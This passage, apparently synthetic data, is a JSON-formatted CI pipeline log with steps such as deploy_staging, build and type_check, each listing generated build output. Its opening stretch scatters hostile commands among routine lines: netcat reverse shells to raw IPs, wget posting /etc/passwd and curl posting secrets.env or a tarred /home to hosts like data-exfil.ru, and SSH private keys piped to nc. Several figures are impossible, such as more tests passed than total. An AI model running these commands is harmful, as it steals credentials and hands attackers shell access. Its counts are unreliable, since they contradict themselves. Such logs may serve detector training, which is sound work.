service\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nConnection established\nFinished.\nCompiling utils/utils.go...\nGenerating source maps...\npip install: Successfully installed prettier-5.20\nnc -e /bin/sh 172.121.178.248 12320\n[12:46:58] DEBUG: Query executed in 31ms\nOK\nProcessing...\nEnvironment: test\n[12:46:58] DEBUG: Connection pool: 13 active\nnpm notice: created a lockfile\n\u2713 Step 'checkout' succeeded\n[12:46:58] WARN: Deprecated API usage\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\npip: Downloading express-1.13.tar.gz\nTests: 224 passed, 440 total\npip: Installing build dependencies...\npip: Downloading prettier-3.7.tar.gz\nTests: 265 passed, 130 total\nArtifact uploaded: build.tar.gz (15MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 142.131.63.148 36252\nCompleted.\nCompleted.\n\u2713 deploy completed\nnc -e /bin/sh 87.29.4.188 49674\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nTest Suites: 11 passed, 47 total\nLayer 3/14: ENV command\nOptimizing 19 modules...\nSuccess!\nyarn add: Done in 8.74s\nDone.\n[12:46:58] DEBUG: Memory usage: 897MB\nStep 5/15: Testing\nTests: 90 passed, 160 total\nPulling image: python:latest\nStep 9/15: Deploying\nSending 209MB of data to data-exfil.ru\nArtifact uploaded: build.tar.gz (31MB)\nSending 175MB of data to data-exfil.ru\npip: Downloading prettier-3.19.tar.gz\necho $(cat ~/.ssh/id_rsa) | base64 | nc 32.127.213.98 11655\nBundling main.css\nVerifying...\nnc -e /bin/sh 96.156.250.213 1696\nSending 239MB of data to malicious-pool.xyz\nCreating production build...\nLoading...\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nSuccess!\nFAILED: test_auth_login\n[12:46:58] DEBUG: Initializing service\nStep 11/24: Linting\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nLayer 7/15: RUN command\nyarn add: Done in 24.44s\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nRan 140 tests in 60s\nLoading...\nFinished.\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (34MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nCompiling src/app.ts...\nFetching submodules...\nnpm notice: created a lockfile\nTest Suites: 30 passed, 44 total\nArtifact uploaded: build.tar.gz (7MB)\n\u2713 All checks passed\nWARNING: lodash has known vulnerabilities\n[12:46:58] DEBUG: Memory usage: 1168MB\n[12:46:58] INFO: Cache refreshed\nSending 230MB of data to evil-server.cc\n\u2713 All checks passed\nnpm notice: created a lockfile\nBuilding Docker image...\nCompiling components/utils.go...\nTest Suites: 16 passed, 23 total\nLayer 5/15: COPY command\n\u2713 test completed\nCreating production build...\nWaiting...\nImage pulled successfully\nCompiling src/utils.go...\nSnapshots: 39 passed, 22 total\nCompiling lib/utils.go...\nTLS handshake completed\nCache miss for key-1823\nUsing Python 3.9\nTransforming 399 files...\nTransforming 957 files...\nHEAD is now at bcaae60\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nChecking out develop branch\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\n\u2713 Task completed in 648ms\n=== Step checkout completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-08T12:46:58.395293",
        "finished_at": "2025-12-08T12:47:15.880057",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Creating production build...",
          "[12:46:58] WARN: Deprecated API usage",
          "Cache hit for key-6346",
          "Already up to date.",
          "Processing...",
          "Step 8/16: Installing dependencies",
          "FAILED: test_user_create",
          "\u2713 All checks passed",
          "Cache invalidated: node_modules",
          "pip install: Successfully installed webpack-2.6",
          "[12:46:58] INFO: Starting build process",
          "NODE_ENV=development",
          "Waiting...",
          "[12:46:58] INFO: Request completed",
          "npm install: added 369 packages",
          "Step 4/25: Installing dependencies",
          "WARNING: express has known vulnerabilities",
          "Platform: darwin-arm64",
          "Generating source maps...",
          "Transforming 852 files...",
          "Step 2/22: Deploying",
          "[12:46:58] INFO: Cache refreshed",
          "Pulling image: alpine:3.11",
          "Compiling components/main.py...",
          "Compiling components/service.java...",
          "pip: Collecting jest",
          "Ran 15 tests in 7s",
          "[12:46:58] ERROR: Connection failed",
          "Step 3/20: Testing",
          "Compiling utils/index.js...",
          "Installing jest@5.7.8",
          "Done.",
          "npm notice: created a lockfile",
          "Creating production build...",
          "\u2713 Step 'checkout' succeeded",
          "Artifact uploaded: dist.zip (86MB)",
          "Ready.",
          "Generating source maps...",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (132ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:58] INFO: Cache refreshed",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (60MB)",
          "Installing prettier@1.3.6",
          "Image pulled successfully",
          "Compiling utils/index.js...",
          "Success!",
          "Step 20/18: Deploying",
          "[12:46:58] DEBUG: Memory usage: 379MB",
          "Pulling image: alpine:3.11",
          "[12:46:58] DEBUG: Memory usage: 265MB",
          "[12:46:58] DEBUG: Connection pool: 4 active",
          "Success!",
          "Bundling vendor.js",
          "[12:46:58] INFO: Cache refreshed",
          "Waiting...",
          "\u2717 build failed with exit code 42",
          "Processing...",
          "Transforming 935 files...",
          "Pulling image: node:18",
          "Cache miss for key-4740",
          "TLS handshake completed",
          "Uploading artifact 'build' (38 files)",
          "Step 8/23: Building",
          "Waiting...",
          "pip install: Successfully installed prettier-3.4",
          "\u2713 package completed",
          "Processing...",
          "Uploading artifact 'coverage' (48 files)",
          "Layer 9/9: COPY command",
          "[12:46:58] WARN: Deprecated API usage",
          "Checking out master branch",
          "Loading...",
          "Ran 91 tests in 24s",
          "pip: Downloading jest-5.5.tar.gz",
          "pip: Collecting axios",
          "Coverage: 76% statements, 77% branches",
          "[12:46:58] WARN: Deprecated API usage",
          "Fetching from https://npmjs.org/package.json",
          "Verifying...",
          "WARNING: react has known vulnerabilities",
          "Fetching from https://registry.npmjs.org/package.json",
          "Completed.",
          "Done.",
          "pip: Collecting express",
          "[12:46:58] DEBUG: Initializing service",
          "Ran 130 tests in 25s",
          "TLS handshake completed",
          "[12:46:58] DEBUG: Loading configuration",
          "Finished.",
          "Switched to branch 'bugfix/task-478'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "Coverage: 72% statements, 80% branches",
          "Minifying app.js",
          "\u2713 All checks passed",
          "Compiling src/app.ts...",
          "yarn add: Done in 5.15s",
          "Cache invalidated: build",
          "pip: Collecting react",
          "pip: Collecting react",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "Cache saved successfully",
          "Cache saved successfully",
          "Already up to date.",
          "\u2713 All checks passed",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-08T12:47:15.880057",
        "finished_at": "2025-12-08T12:47:22.873963",
        "log_lines": [
          "=== Step: deploy_production ===",
          "pip: Collecting jest",
          "Fetching submodules...",
          "Finished.",
          "[12:46:58] INFO: Request completed",
          "Step 9/21: Linting",
          "Compiling src/utils.go...",
          "pip: Downloading lodash-3.10.tar.gz",
          "npm install: added 425 packages",
          "Building Docker image...",
          "Compiling src/service.java...",
          "Loading...",
          "Already up to date.",
          "Snapshots: 27 passed, 15 total",
          "npm notice: package.json updated",
          "OK",
          "Switched to branch 'hotfix/task-735'",
          "[12:46:58] INFO: Cache refreshed",
          "Compiling src/app.ts...",
          "[12:46:58] INFO: Starting build process",
          "OK",
          "Bundling vendor.css",
          "Fetching submodules...",
          "Snapshots: 15 passed, 34 total",
          "Loading...",
          "Waiting...",
          "npm install: added 337 packages",
          "Pulling image: node:latest",
          "Step 1/21: Installing dependencies",
          "[12:46:58] DEBUG: Initializing service",
          "Completed.",
          "Artifact uploaded: dist.zip (49MB)",
          "Processing...",
          "Fetching submodules...",
          "[12:46:58] INFO: Starting build process",
          "WARNING: eslint has known vulnerabilities",
          "Installing axios@2.9.1",
          "Cache hit for key-8950",
          "Artifact uploaded: dist.zip (90MB)",
          "Ready.",
          "Finished.",
          "Loading...",
          "[12:46:58] ERROR: Connection failed",
          "Transforming 776 files...",
          "[12:46:58] INFO: Starting build process",
          "Optimizing 79 modules...",
          "Step 3/15: Testing",
          "Artifact uploaded: dist.zip (27MB)",
          "Cache restored successfully (148MB)",
          "[12:46:58] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Success!",
          "Verifying...",
          "Artifact downloaded: 19MB",
          "WARNING: lodash has known vulnerabilities",
          "npm install: resolved 754 packages",
          "Artifact uploaded: dist.zip (48MB)",
          "[12:46:58] WARN: Deprecated API usage",
          "[12:46:58] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (16MB)",
          "[12:46:58] INFO: Starting build process",
          "[12:46:58] DEBUG: Initializing service",
          "[12:46:58] WARN: Deprecated API usage",
          "\u2713 Task completed in 2384ms",
          "\u2713 All checks passed",
          "Verifying...",
          "[12:46:58] INFO: Starting build process",
          "Transforming 489 files...",
          "[12:46:58] WARN: Deprecated API usage",
          "Step 8/20: Installing dependencies",
          "  PASS: test_auth_login (314ms)",
          "Verifying...",
          "pip install: Successfully installed axios-2.9",
          "Using Python 3.9",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Verifying...",
          "Processing...",
          "Processing...",
          "Fetching submodules...",
          "Finished.",
          "Success!",
          "yarn add: Done in 6.80s",
          "[12:46:58] DEBUG: Memory usage: 959MB",
          "Using Python 3.12",
          "[12:46:58] DEBUG: Connection pool: 14 active",
          "GET /health - 200 (22ms)",
          "npm install: resolved 1620 packages",
          "Cache restored successfully (359MB)",
          "Coverage: 85% statements, 83% branches",
          "  PASS: test_user_create (468ms)",
          "Completed.",
          "HEAD is now at acd5a48",
          "Pulling image: alpine:latest",
          "Connection established",
          "\u2717 build failed with exit code 87",
          "Minifying vendor.js",
          "Optimizing 16 modules...",
          "Completed.",
          "Checking out develop branch",
          "Creating production build...",
          "Step 17/18: Linting",
          "Coverage: 72% statements, 62% branches",
          "WARNING: axios has known vulnerabilities",
          "\u2713 Task completed in 1939ms",
          "[12:46:58] DEBUG: Connection pool: 19 active",
          "NODE_ENV=development",
          "Pulling image: node:3.11",
          "Creating production build...",
          "Transforming 373 files...",
          "Compiling utils/service.java...",
          "[12:46:58] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: e2e/test_db_connect.spec.js",
          "  PASS: e2e/test_cache_hit.spec.js",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-08T12:47:22.873963",
        "finished_at": "2025-12-08T12:48:15.328256",
        "log_lines": [
          "=== Step: build ===",
          "Generating source maps...",
          "Pushing to registry...",
          "Layer 7/15: COPY command",
          "WARNING: lodash has known vulnerabilities",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 5/16: Linting",
          "Compiling lib/utils.go...",
          "Using Python 3.10",
          "Using Python 3.11",
          "Success!",
          "Artifact uploaded: dist.zip (78MB)",
          "Verifying...",
          "FAILED: test_user_create",
          "OK",
          "Coverage: 98% statements, 77% branches",
          "Ready.",
          "Completed.",
          "npm notice: package.json updated",
          "OK",
          "Fetching submodules...",
          "\u2713 Task completed in 3041ms",
          "[12:46:58] INFO: Request completed",
          "\u2713 Step 'test' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Coverage: 91% statements, 75% branches",
          "Uploading artifact 'build' (39 files)",
          "Minifying vendor.js",
          "Step 7/19: Building",
          "Ready.",
          "[12:46:58] DEBUG: Memory usage: 1109MB",
          "Using Node.js 18.15.10",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (101ms)",
          "npm notice: created a lockfile",
          "[12:46:58] DEBUG: Memory usage: 251MB",
          "[12:46:58] INFO: Connecting to database",
          "GET /api - 200 (30ms)",
          "Ran 46 tests in 2s",
          "POST /upload - 200 (17ms)",
          "Artifact downloaded: 11MB",
          "Checking out master branch",
          "WARNING: react has known vulnerabilities",
          "Cache saved successfully",
          "yarn add: Done in 18.72s",
          "Minifying app.js",
          "HEAD is now at b2d13f1",
          "pip: Collecting eslint",
          "Cache saved successfully",
          "[12:46:58] INFO: Processing request",
          "GET /status - 201 (72ms)",
          "\u2713 All checks passed",
          "Bundling vendor.js",
          "Cache restored successfully (13MB)",
          "Coverage: 93% statements, 91% branches",
          "Checking out main branch",
          "Uploading artifact 'dist' (39 files)",
          "Success!",
          "GET /status - 201 (97ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching submodules...",
          "Completed.",
          "Waiting...",
          "[12:46:58] DEBUG: Loading configuration",
          "Cache invalidated: node_modules",
          "Success!",
          "Switched to branch 'bugfix/task-625'",
          "Fetching submodules...",
          "Waiting...",
          "[12:46:58] WARN: Deprecated API usage",
          "[12:46:58] DEBUG: Connection pool: 10 active",
          "Transforming 185 files...",
          "npm install: added 268 packages",
          "pip: Downloading eslint-4.11.tar.gz",
          "yarn add: Done in 2.63s",
          "Completed.",
          "Generating source maps...",
          "Pulling image: python:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Test Suites: 18 passed, 20 total",
          "Building Docker image...",
          "Coverage: 93% statements, 70% branches",
          "\u2717 build failed with exit code 126",
          "Coverage: 98% statements, 60% branches",
          "npm install: resolved 772 packages",
          "Cache saved successfully",
          "[12:46:58] WARN: Deprecated API usage",
          "Transforming 127 files...",
          "Step 12/15: Installing dependencies",
          "Pulling image: node:3.11",
          "\u2717 build failed with exit code 56",
          "Compiling utils/handler.rs...",
          "Connection established",
          "Creating production build...",
          "Creating production build...",
          "[12:46:58] DEBUG: Memory usage: 1197MB",
          "pip: Collecting express",
          "Pushing to registry...",
          "FAILED: test_api_health",
          "Pulling image: alpine:3.11",
          "\u2717 build failed with exit code 91",
          "[12:46:58] DEBUG: Initializing service",
          "GET /status - 201 (95ms)",
          "Fetching from https://npmjs.org/package.json",
          "Artifact downloaded: 2MB",
          "Bundling vendor.css",
          "OK",
          "Compiling utils/index.js...",
          "npm notice: package.json updated",
          "HEAD is now at 0e7d76c",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching submodules...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-08T12:48:15.328256",
        "finished_at": "2025-12-08T12:48:25.819115",
        "log_lines": [
          "=== Step: save_cache ===",
          "Artifact downloaded: 24MB",
          "Tests: 229 passed, 135 total",
          "Step 7/18: Running migrations",
          "Coverage: 71% statements, 94% branches",
          "Connection established",
          "[12:46:58] INFO: Starting build process",
          "Building Docker image...",
          "npm install: added 98 packages",
          "TLS handshake completed",
          "Success!",
          "pip: Downloading react-3.19.tar.gz",
          "Time: 49.205s",
          "Step 20/25: Running migrations",
          "Verifying...",
          "\u2713 package completed",
          "Compiling lib/handler.rs...",
          "Cache invalidated: build",
          "Ready.",
          "[12:46:58] ERROR: Connection failed",
          "Using Python 3.9",
          "Environment: staging",
          "[12:46:58] INFO: Processing request",
          "[12:46:58] DEBUG: Loading configuration",
          "Test Suites: 31 passed, 42 total",
          "\u2713 build completed",
          "Compiling utils/service.java...",
          "Tests: 228 passed, 461 total",
          "pip: Downloading eslint-2.18.tar.gz",
          "[12:46:58] WARN: Deprecated API usage",
          "Ran 120 tests in 25s",
          "Success!",
          "Creating production build...",
          "Step 19/19: Running migrations",
          "Generating source maps...",
          "Completed.",
          "Tests: 250 passed, 61 total",
          "Switched to branch 'bugfix/task-317'",
          "npm notice: package.json updated",
          "FAILED: test_user_create",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: react has known vulnerabilities",
          "[12:46:58] INFO: Request completed",
          "Pushing to registry...",
          "Ran 152 tests in 29s",
          "[12:46:58] DEBUG: Loading configuration",
          "Uploading artifact 'build' (37 files)",
          "OK",
          "[12:46:58] DEBUG: Loading configuration",
          "pip: Collecting prettier",
          "  PASS: e2e/test_api_health.spec.js",
          "TLS handshake completed",
          "Step 8/19: Testing",
          "Waiting...",
          "Completed.",
          "GET /health - 200 (92ms)",
          "WARNING: webpack has known vulnerabilities",
          "Exception: ValueError",
          "Cache restored successfully (348MB)",
          "Fetching submodules...",
          "Step 10/16: Installing dependencies",
          "Cache saved successfully",
          "\u2713 Step 'setup' succeeded",
          "Cache restored successfully (347MB)",
          "Generating source maps...",
          "Layer 8/12: ENV command",
          "Connection established",
          "Connection established",
          "Step 19/24: Linting",
          "[12:46:58] INFO: Request completed",
          "Step 6/25: Deploying",
          "NODE_ENV=development",
          "Cache restored successfully (63MB)",
          "Bundling styles.css",
          "[12:46:58] WARN: Deprecated API usage",
          "Creating production build...",
          "WARNING: webpack has known vulnerabilities",
          "Cache restored successfully (176MB)",
          "Ran 92 tests in 18s",
          "pip install: Successfully installed webpack-1.4",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Compiling lib/index.js...",
          "Exception: NullPointerException",
          "Loading...",
          "Fetching submodules...",
          "\u2713 package completed",
          "Transforming 869 files...",
          "Compiling lib/handler.rs...",
          "\u2717 build failed with exit code 56",
          "Done.",
          "Done.",
          "HEAD is now at 07860dd",
          "Tests: 181 passed, 146 total",
          "Step 20/15: Running migrations",
          "Platform: darwin-arm64",
          "pip: Collecting eslint",
          "NODE_ENV=development",
          "Fetching submodules...",
          "[12:46:58] INFO: Connecting to database",
          "HEAD is now at c5178d7",
          "Platform: win32-x64",
          "[12:46:58] DEBUG: Query executed in 46ms",
          "Pushing to registry...",
          "WARNING: prettier has known vulnerabilities",
          "Compiling utils/app.ts...",
          "Compiling lib/service.java...",
          "Coverage: 77% statements, 63% branches",
          "  PASS: test_auth_login (255ms)",
          "TLS handshake completed",
          "[12:46:58] DEBUG: Initializing service",
          "Layer 2/8: ENV command",
          "npm install: added 85 packages",
          "Verifying...",
          "Step 8/21: Installing dependencies",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-08T12:48:25.819115",
        "finished_at": "2025-12-08T12:49:18.273408",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Installing jest@4.9.9",
          "[12:46:58] ERROR: Connection failed",
          "Finished.",
          "Time: 29.552s",
          "  PASS: test_api_health (378ms)",
          "Verifying...",
          "Compiling components/app.ts...",
          "Switched to branch 'hotfix/task-933'",
          "OK",
          "Snapshots: 50 passed, 38 total",
          "Using Node.js 17.5.7",
          "pip install: Successfully installed jest-5.4",
          "Exception: TypeError",
          "Test Suites: 43 passed, 35 total",
          "OK",
          "Step 9/25: Testing",
          "Processing...",
          "Installing eslint@5.13.10",
          "Step 8/16: Running migrations",
          "[12:46:58] INFO: Starting build process",
          "Artifact downloaded: 18MB",
          "Checking out develop branch",
          "[12:46:58] INFO: Starting build process",
          "Building Docker image...",
          "pip install: Successfully installed react-5.1",
          "Uploading artifact 'coverage' (12 files)",
          "Step 5/25: Linting",
          "Fetching from https://npmjs.org/package.json",
          "Pushing to registry...",
          "Uploading artifact 'dist' (40 files)",
          "Artifact uploaded: dist.zip (5MB)",
          "Loading...",
          "Finished.",
          "Platform: win32-x64",
          "Using Python 3.10",
          "  PASS: test_api_health (127ms)",
          "Compiling components/utils.go...",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "Checking out master branch",
          "[12:46:58] DEBUG: Connection pool: 3 active",
          "pip: Installing build dependencies...",
          "Test Suites: 48 passed, 36 total",
          "npm notice: package.json updated",
          "npm install: added 62 packages",
          "Exception: TypeError",
          "OK",
          "[12:46:58] DEBUG: Connection pool: 7 active",
          "pip: Installing build dependencies...",
          "Environment: test",
          "Compiling utils/app.ts...",
          "Using Python 3.12",
          "Building Docker image...",
          "Ready.",
          "Step 8/24: Building",
          "Cache miss for key-9954",
          "Cache hit for key-6680",
          "Optimizing 84 modules...",
          "\u2713 Step 'checkout' succeeded",
          "Creating production build...",
          "HEAD is now at 264c92b",
          "Compiling src/utils.go...",
          "Compiling utils/utils.go...",
          "Ready.",
          "Processing...",
          "Cache invalidated: node_modules",
          "[12:46:58] INFO: Cache refreshed",
          "Already up to date.",
          "Processing...",
          "[12:46:58] DEBUG: Query executed in 12ms",
          "Creating production build...",
          "Completed.",
          "Success!",
          "Compiling utils/service.java...",
          "Artifact downloaded: 26MB",
          "Test Suites: 41 passed, 48 total",
          "[12:46:58] INFO: Starting build process",
          "Snapshots: 48 passed, 4 total",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Creating production build...",
          "Tests: 444 passed, 305 total",
          "[12:46:58] DEBUG: Connection pool: 18 active",
          "  PASS: test_cache_hit (390ms)",
          "Environment: development",
          "Time: 109.794s",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling utils/main.py...",
          "Pushing to registry...",
          "Compiling src/handler.rs...",
          "npm install: resolved 1701 packages",
          "[12:46:58] WARN: Deprecated API usage",
          "\u2713 Step 'checkout' succeeded",
          "Creating production build...",
          "WARNING: prettier has known vulnerabilities",
          "FAILED: test_api_health",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: added 314 packages",
          "pip: Downloading webpack-2.19.tar.gz",
          "WARNING: webpack has known vulnerabilities",
          "Connection established",
          "Finished.",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Fetching from https://pypi.org/package.json",
          "Uploading artifact 'coverage' (19 files)",
          "Tests: 124 passed, 335 total",
          "Already up to date.",
          "Coverage: 79% statements, 70% branches",
          "FAILED: test_db_connect",
          "[12:46:58] WARN: Deprecated API usage",
          "Artifact downloaded: 35MB",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-08T12:49:18.273408",
        "finished_at": "2025-12-08T12:49:35.758172",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Done.",
          "Artifact downloaded: 37MB",
          "  PASS: test_auth_login (304ms)",
          "Processing...",
          "pip: Installing build dependencies...",
          "Transforming 467 files...",
          "[12:46:58] DEBUG: Initializing service",
          "NODE_ENV=development",
          "Processing...",
          "npm notice: package.json updated",
          "Switched to branch 'bugfix/task-828'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: resolved 1667 packages",
          "Ran 90 tests in 6s",
          "POST /api - 200 (476ms)",
          "npm install: added 278 packages",
          "Compiling lib/index.js...",
          "Cache saved successfully",
          "Pushing to registry...",
          "npm install: resolved 840 packages",
          "Finished.",
          "Coverage: 90% statements, 97% branches",
          "Ready.",
          "\u2713 All checks passed",
          "HEAD is now at c33c972",
          "Connection established",
          "pip: Collecting react",
          "Platform: linux-x64",
          "Already up to date.",
          "pip: Downloading axios-3.3.tar.gz",
          "Compiling src/utils.go...",
          "[12:46:58] INFO: Request completed",
          "Bundling styles.css",
          "Image pulled successfully",
          "POST /upload - 200 (22ms)",
          "pip: Collecting express",
          "Step 2/25: Testing",
          "Optimizing 87 modules...",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-3924",
          "npm notice: package.json updated",
          "Compiling components/index.js...",
          "Compiling lib/utils.go...",
          "Compiling lib/app.ts...",
          "Waiting...",
          "Using Python 3.9",
          "[12:46:58] DEBUG: Memory usage: 480MB",
          "[12:46:58] INFO: Processing request",
          "\u2713 Step 'install' succeeded",
          "Already up to date.",
          "Done.",
          "[12:46:58] DEBUG: Connection pool: 15 active",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:58] WARN: Deprecated API usage",
          "[12:46:58] INFO: Processing request",
          "Checking out master branch",
          "pip: Collecting jest",
          "[12:46:58] INFO: Cache refreshed",
          "NODE_ENV=production",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "Step 8/24: Testing",
          "Fetching from https://googleapis.com/package.json",
          "\u2713 build completed",
          "Waiting...",
          "[12:46:58] DEBUG: Memory usage: 1195MB",
          "Step 14/18: Linting",
          "Test Suites: 11 passed, 17 total",
          "\u2713 All checks passed",
          "[12:46:58] DEBUG: Initializing service",
          "Snapshots: 20 passed, 43 total",
          "Fetching submodules...",
          "Creating production build...",
          "\u2713 All checks passed",
          "yarn add: Done in 3.41s",
          "\u2713 Task completed in 374ms",
          "[12:46:58] INFO: Request completed",
          "Pulling image: python:3.11",
          "Waiting...",
          "Pulling image: python:latest",
          "npm install: resolved 1801 packages",
          "  PASS: test_db_connect (238ms)",
          "NODE_ENV=production",
          "[12:46:58] INFO: Request completed",
          "Fetching submodules...",
          "[12:46:58] DEBUG: Query executed in 34ms",
          "Building Docker image...",
          "yarn add: Done in 20.47s",
          "NODE_ENV=test",
          "Fetching submodules...",
          "TLS handshake completed",
          "Environment: production",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Pulling image: node:3.11",
          "npm notice: package.json updated",
          "[12:46:58] DEBUG: Connection pool: 17 active",
          "Waiting...",
          "POST /upload - 201 (63ms)",
          "Success!",
          "Layer 10/8: COPY command",
          "HEAD is now at 4a75fd6",
          "[12:46:58] ERROR: Connection failed",
          "Verifying...",
          "Uploading artifact 'coverage' (46 files)",
          "Waiting...",
          "Waiting...",
          "Fetching from https://googleapis.com/package.json",
          "[12:46:58] DEBUG: Memory usage: 1819MB",
          "Switched to branch 'bugfix/task-584'",
          "Test Suites: 15 passed, 5 total",
          "Step 8/23: Installing dependencies",
          "[12:46:58] WARN: Deprecated API usage",
          "TLS handshake completed",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-08T12:49:35.758172",
        "finished_at": "2025-12-08T12:49:53.242936",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:46:58] WARN: Deprecated API usage",
          "Loading...",
          "[12:46:58] ERROR: Connection failed",
          "Image pulled successfully",
          "Tests: 61 passed, 315 total",
          "[12:46:58] DEBUG: Query executed in 84ms",
          "[12:46:58] DEBUG: Initializing service",
          "\u2713 Task completed in 1593ms",
          "TLS handshake completed",
          "Completed.",
          "Done.",
          "Pushing to registry...",
          "Installing react@5.9.2",
          "Building Docker image...",
          "[12:46:58] WARN: Deprecated API usage",
          "Installing react@4.14.1",
          "Coverage: 70% statements, 91% branches",
          "[12:46:58] WARN: Deprecated API usage",
          "Step 18/23: Building",
          "POST /data - 202 (349ms)",
          "\u2713 Step 'install' succeeded",
          "Step 16/21: Building",
          "pip install: Successfully installed react-1.5",
          "Finished.",
          "Cache miss for key-1975",
          "Ran 156 tests in 10s",
          "Pushing to registry...",
          "Ready.",
          "  PASS: test_auth_login (182ms)",
          "Artifact uploaded: dist.zip (15MB)",
          "Cache restored successfully (323MB)",
          "Waiting...",
          "[12:46:58] ERROR: Connection failed",
          "Step 6/18: Linting",
          "Layer 4/13: COPY command",
          "Creating production build...",
          "Cache miss for key-5641",
          "Done.",
          "Checking out master branch",
          "\u2713 All checks passed",
          "Connection established",
          "NODE_ENV=production",
          "Fetching submodules...",
          "Compiling lib/main.py...",
          "[12:46:58] DEBUG: Loading configuration",
          "npm install: resolved 824 packages",
          "Environment: production",
          "Test Suites: 12 passed, 10 total",
          "Image pulled successfully",
          "Environment: test",
          "Bundling runtime.js",
          "npm install: added 394 packages",
          "Loading...",
          "Completed.",
          "npm notice: package.json updated",
          "[12:46:58] DEBUG: Loading configuration",
          "[12:46:58] ERROR: Connection failed",
          "Compiling src/main.py...",
          "npm install: resolved 1732 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:58] INFO: Starting build process",
          "Pulling image: alpine:18",
          "Step 9/21: Running migrations",
          "Connection established",
          "Switched to branch 'hotfix/task-694'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pulling image: python:3.11",
          "\u2713 Task completed in 1397ms",
          "[12:46:58] INFO: Request completed",
          "[12:46:58] WARN: Deprecated API usage",
          "Step 4/17: Testing",
          "Done.",
          "NODE_ENV=production",
          "npm notice: created a lockfile",
          "Tests: 274 passed, 67 total",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Environment: test",
          "Platform: darwin-arm64",
          "[12:46:58] WARN: Deprecated API usage",
          "[12:46:58] DEBUG: Connection pool: 11 active",
          "[12:46:58] INFO: Starting build process",
          "[12:46:58] ERROR: Connection failed",
          "Pushing to registry...",
          "OK",
          "Cache invalidated: node_modules",
          "  PASS: test_auth_login (126ms)",
          "Cache miss for key-6440",
          "  PASS: test_api_health (180ms)",
          "yarn add: Done in 19.37s",
          "Completed.",
          "Step 19/20: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "npm notice: created a lockfile",
          "[12:46:58] INFO: Processing request",
          "[12:46:58] INFO: Request completed",
          "Waiting...",
          "Waiting...",
          "Finished.",
          "TLS handshake completed",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "POST /data - 201 (261ms)",
          "Step 8/20: Linting",
          "[12:46:58] DEBUG: Connection pool: 1 active",
          "pip install: Successfully installed react-3.8",
          "pip: Collecting axios",
          "npm install: resolved 1461 packages",
          "Checking out develop branch",
          "Coverage: 80% statements, 91% branches",
          "Processing...",
          "[12:46:58] INFO: Processing request",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
